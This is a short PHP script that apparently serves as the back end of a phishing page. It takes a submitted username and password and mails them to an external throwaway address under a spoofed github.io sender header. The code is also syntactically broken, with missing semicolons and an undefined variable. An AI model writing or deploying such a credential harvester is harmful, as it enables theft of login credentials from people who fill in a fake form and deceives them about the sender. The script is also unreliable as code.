<?php

  $user = $_POST['user'];
  $pass = $_POST['pass'];
 

  $to = "yonajoj493@naymeo.com";
  $email_subject = "$user \r\n"
  $email_body = "$pass \r\n"

  $headers = "From: sent@github.io";

  $headers .= "Reply-To: $visitor_email \r\n";

  mail($to,$email_subject,$email_body,$headers);
 ?>

